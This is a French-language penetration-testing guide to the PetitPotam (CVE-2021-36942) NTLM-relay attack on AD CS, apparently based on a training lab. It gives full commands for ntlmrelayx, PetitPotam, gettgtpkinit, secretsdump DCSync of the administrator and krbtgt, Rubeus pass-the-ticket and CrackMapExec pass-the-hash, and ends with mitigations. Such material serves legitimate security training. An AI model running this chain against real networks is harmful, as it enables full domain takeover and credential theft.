# PetitPotam (MS-EFSRPC)

### <mark style="color:red;">PetitPotam (MS-EFSRPC)</mark>

PetitPotam (CVE-2021-36942) est une vulnérabilité de falsification de l’authentification LSA qui a été corrigée en août 2021.&#x20;

Cette faille permet à un attaquant non authentifié de forcer un contrôleur de domaine à s’authentifier auprès d’un autre hôte en utilisant NTLM sur le port 445 via le protocole **LSARPC** (Local Security Authority Remote Protocol). Pour ce faire, l’attaque exploite le protocole **MS-EFSRPC** (Encrypting File System Remote Protocol) de Microsoft.

Cette technique permet à un attaquant non authentifié de prendre le contrôle d’un domaine Windows où **Active Directory Certificate Services (AD CS)** est déployé. L’attaque consiste à relayer une demande d’authentification du contrôleur de domaine ciblé vers la page Web d’Enrôlement de l’Autorité de Certification (CA). Ensuite, l’attaquant soumet une **demande de signature de certificat (CSR)** pour obtenir un nouveau certificat numérique.

{% hint style="info" %}
🔥 <mark style="color:green;">**Objectif de l’attaque**</mark>

L’attaquant veut obtenir **les droits d’administrateur** sur un réseau Windows sans connaître aucun mot de passe. Pour y arriver, il va **forcer un serveur à s’authentifier ailleurs** et **intercepter ses informations d’identification**.

***

<mark style="color:green;">**Les composants utilisés dans l’attaque**</mark>

📌 **NTLM (NT LAN Manager)**

* C'est un protocole d’authentification utilisé sur Windows pour vérifier l’identité d’un utilisateur ou d’un ordinateur.
* **Exemple réel** : Imagine que tu appelles ta banque et qu’ils te demandent ton numéro de client avant de te donner des informations. NTLM fonctionne de la même manière : il échange des informations pour prouver que l’utilisateur est bien qui il prétend être.

📌 **LSARPC (Local Security Authority Remote Protocol)**

* C’est un protocole qui permet aux ordinateurs Windows de communiquer entre eux pour **vérifier les autorisations** des utilisateurs.
* **Exemple réel** : C’est comme un agent de sécurité à l’entrée d’un bâtiment qui demande ton badge pour voir si tu as le droit d’entrer.

📌 **MS-EFSRPC (Encrypting File System Remote Protocol)**

* Un protocole qui permet à un ordinateur Windows de **chiffrer et décrypter des fichiers à distance**.
* **Exemple réel** : Imagine un coffre-fort électronique dans une entreprise où seuls les employés autorisés peuvent accéder aux documents sensibles.

📌 **AD CS (Active Directory Certificate Services)**

* Un service Windows qui gère **les certificats numériques** (comme une carte d’identité électronique) pour sécuriser les connexions.
* **Exemple réel** : C’est comme un passeport numérique qui prouve ton identité sur un réseau sécurisé.

📌 **CSR (Certificate Signing Request)**

* Une demande envoyée pour obtenir un **certificat numérique** auprès d’une autorité de certification (CA).
* **Exemple réel** : C’est comme demander une nouvelle carte d’identité à la mairie.

***

&#x20;<mark style="color:green;">**Comment fonctionne l’attaque ?**</mark>

✅ **1. L’attaquant force le serveur à s’authentifier ailleurs (Coercition d’authentification)**

* L’attaquant envoie une requête malveillante au **Contrôleur de Domaine** (DC) en utilisant **LSARPC** et **MS-EFSRPC**.
* Le serveur DC pense qu’il doit répondre et envoie **ses informations d’identification** sous la forme d’un **hash NTLM** (mot de passe chiffré).
* **Exemple réel** : Imagine que quelqu’un t’appelle en se faisant passer pour ton patron et te demande d’envoyer un code secret à une autre personne. Tu obéis sans savoir que c’est une arnaque.

***

✅ **2. L’attaquant intercepte ces informations et les relaie (NTLM Relay Attack)**

* L’attaquant utilise un outil comme **ntlmrelayx.py** pour **rediriger** ces informations vers **l’Autorité de Certification (CA)**.
* **Exemple réel** : Imagine qu’un pirate intercepte ton SMS de validation bancaire et l’envoie à un faux site pour voler ton compte.

***

✅ **3. L’attaquant demande un certificat numérique (CSR)**

* Avec les informations du serveur DC, l’attaquant demande un **certificat numérique** en son nom.
* L’Autorité de Certification (CA) **ne se doute de rien** et génère un **certificat valide**.
* **Exemple réel** : C’est comme si quelqu’un volait ta carte d’identité et demandait un passeport en ton nom.

***

✅ **4. L’attaquant utilise ce certificat pour obtenir un TGT (Ticket de connexion)**

* L’attaquant utilise **Rubeus** ou **gettgtpkinit.py** pour demander un **TGT (Ticket Granting Ticket)** au serveur d’authentification Kerberos.
* Ce ticket permet **d’agir comme l’administrateur du réseau**.
* **Exemple réel** : C’est comme si un pirate obtenait une carte magnétique qui ouvre toutes les portes d’un immeuble.

***

✅ **5. L’attaquant utilise DCSync pour prendre le contrôle du domaine**

* Avec ce ticket, il peut exécuter une attaque **DCSync**, qui lui permet **de récupérer tous les mots de passe du réseau**.
* **Exemple réel** : C’est comme si un hacker arrivait à pirater un coffre-fort et obtenait les clés de tous les bureaux d’une entreprise.

***
{% endhint %}

#### <mark style="color:green;">1. Préparation du relais NTLM vers AD CS</mark>

**But :** Forcer un contrôleur de domaine (DC) à s’authentifier auprès du serveur d’Active Directory Certificate Services (AD CS) via le protocole NTLM.

**Commande :**\
Lancer `ntlmrelayx.py` pour écouter les connexions relayées et rediriger l’authentification vers le serveur Web de l’AD CS.

{% code overflow="wrap" fullWidth="true" %}
```bash
sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController
```
{% endcode %}

_Ce serveur relais attend qu’un DC se connecte afin de récupérer une authentification (et ensuite un certificat) via AD CS._

***

#### <mark style="color:green;">2. Déclenchement de l’authentification avec PetitPotam</mark>

**But :** Coercer le DC à s’authentifier sur votre machine, ce qui déclenche la connexion relayée.

**Commande (Linux – version Python) :**

```bash
python3 PetitPotam.py <IP_ATTACK_HOST> <IP_DOMAIN_CONTROLLER>
```

_Exemple :_

```bash
python3 PetitPotam.py 172.16.5.225 172.16.5.5
```

**Alternatives :**

* **Exécutable Windows :** Une version binaire de PetitPotam est également disponible pour Windows.
*   **Mimikatz :**

    ```mimikatz
    mimikatzCopyEditmisc::efs /server:<Domain_Controller> /connect:<ATTACK_HOST>
    ```
* **PowerShell :** Utiliser `Invoke-PetitPotam.ps1`.

_L’attaque exploite la fonction `EfsRpcOpenFileRaw` pour obtenir une réponse « ERROR\_BAD\_NETPATH » qui confirme le succès et force le DC à s’authentifier vers vous._

***

#### <mark style="color:green;">3. Récupération du certificat de la machine (DC)</mark>

**But :** Grâce au relais NTLM, `ntlmrelayx.py` intercepte l’authentification et récupère le certificat base64 encodé du compte machine du DC.

_Dans la fenêtre où `ntlmrelayx.py` tourne, vous verrez alors apparaître une authentification réussie, suivie de la génération du CSR et de la récupération du certificat (affiché en base64)._

***

#### <mark style="color:green;">4. Obtention d’un Ticket-Granting Ticket (TGT) via PKINIT</mark>

**But :** Utiliser le certificat récupéré pour demander un TGT pour le compte machine du DC.

**Commande :**

{% code overflow="wrap" fullWidth="true" %}
```bash
python3 /opt/PKINITtools/gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\$ -pfx-base64 <CERTIFICAT_BASE64> dc01.ccache
```
{% endcode %}

_Le TGT est sauvegardé dans le fichier `dc01.ccache`._

***

#### <mark style="color:green;">5. Configuration de l’environnement Kerberos</mark>

**But :** Faire en sorte que les outils ultérieurs utilisent le TGT obtenu.

**Commande :**

{% code fullWidth="true" %}
```bash
export KRB5CCNAME=dc01.ccache
```
{% endcode %}

***

#### <mark style="color:green;">6. Réalisation d’un DCSync avec secretsdump.py</mark>

**But :** Avec le TGT (qui vous authentifie en tant que DC), exécuter un DCSync pour récupérer les hash NTLM (mot de passe) d’un compte (par exemple, l’administrateur du domaine).

**Commande :**

{% code overflow="wrap" fullWidth="true" %}
```bash
secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
```
{% endcode %}

_Ou, si l’outil récupère automatiquement le nom d’utilisateur depuis le ccache :_

{% code fullWidth="true" %}
```bash
secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
```
{% endcode %}

***

#### <mark style="color:green;">7. (Optionnel) Extraction de l’NT Hash via getnthash.py</mark>

**But :** Obtenir l’NT Hash du compte DC en utilisant la clé AS-REP obtenue lors de la demande du TGT.

**Commande :**

{% code fullWidth="true" %}
```bash
python /opt/PKINITtools/getnthash.py -key <AS-REP_ENCRYPTION_KEY> INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01$
```
{% endcode %}

***

#### <mark style="color:green;">8. (Optionnel – depuis Windows) Demande de TGT et Pass-The-Ticket (PTT) avec Rubeus</mark>

**But :** Sur un hôte Windows, utiliser le certificat pour demander un TGT et charger immédiatement le ticket en mémoire.

**Commande :**

{% code fullWidth="true" %}
```powershell
.\Rubeus.exe asktgt /user:ACADEMY-EA-DC01$ /certificate:<CERTIFICAT_BASE64> /ptt
```
{% endcode %}

***

#### <mark style="color:green;">9. Confirmation et exploitation des privilèges obtenus</mark>

**But :** Vérifier que le ticket est bien importé (par exemple avec `klist`) et utiliser l’accès obtenu pour réaliser d’autres actions (extraction d’informations sensibles, pivot, etc.).

**Exemple d’utilisation avec CrackMapExec :**

```bash
crackmapexec smb 172.16.5.5 -u administrator -H <NTLM_HASH>
```

**Utilisation de Mimikatz pour réaliser un DCSync (extraction de la hash du compte KRBTGT) :**

```mimikatz
tlsadump::dcsync /user:inlanefreight\krbtgt
```

***

#### <mark style="color:green;">Remarques complémentaires :</mark>

* **Mitigations :**
  * Appliquer le patch CVE-2021-36942 sur tous les hôtes concernés.
  * Restreindre et désactiver NTLM (par exemple en forçant l’authentification via HTTPS et en désactivant NTLM sur les serveurs AD CS et Domain Controllers).

{% hint style="warning" %}
La désactivation (ou la restriction) de NTLM vise à éliminer un vecteur d’attaque connu pour être exploitable afin de relayer ou de falsifier des authentifications. Concrètement, voici ce que cela permet :

1. **Réduction des attaques par relais NTLM :**\
   NTLM est un protocole d’authentification hérité qui ne propose pas de validation mutuelle robuste. Un attaquant peut ainsi intercepter une authentification NTLM (par exemple, via des outils comme ntlmrelayx ou PetitPotam) et la relayer vers un service (comme AD CS) pour obtenir des accès non autorisés. En désactivant NTLM, vous bloquez ce type d’attaque car les authentifications NTLM ne seront plus acceptées.
2. **Forcer l’usage de protocoles plus sûrs (comme Kerberos) :**\
   Kerberos est le protocole d’authentification par défaut dans les environnements Windows modernes et offre de meilleures garanties en matière de sécurité, notamment grâce à une meilleure gestion de la mutualisation et des tickets. En forçant l’authentification via HTTPS et en désactivant NTLM, vous vous assurez que seuls des mécanismes d’authentification plus robustes sont utilisés.
3. **Limitation de la surface d’attaque sur des services sensibles :**\
   Certains services critiques comme AD CS (Active Directory Certificate Services) ou les Domain Controllers peuvent être ciblés via NTLM pour obtenir des certificats ou lancer des attaques de type DCSync. En désactivant NTLM sur ces serveurs, vous empêchez un attaquant de les utiliser pour forcer une authentification et ensuite exploiter cette connexion relayée.
{% endhint %}

* Mettre en place des contrôles de détection et de durcissement des configurations AD.
* **Impact :** Une fois que l’attaquant a obtenu un accès en tant que DC (ou récupéré les hash sensibles via DCSync), il peut réaliser une compromission totale du domaine (ex : Golden Ticket, persistence, exfiltration, etc.).fi
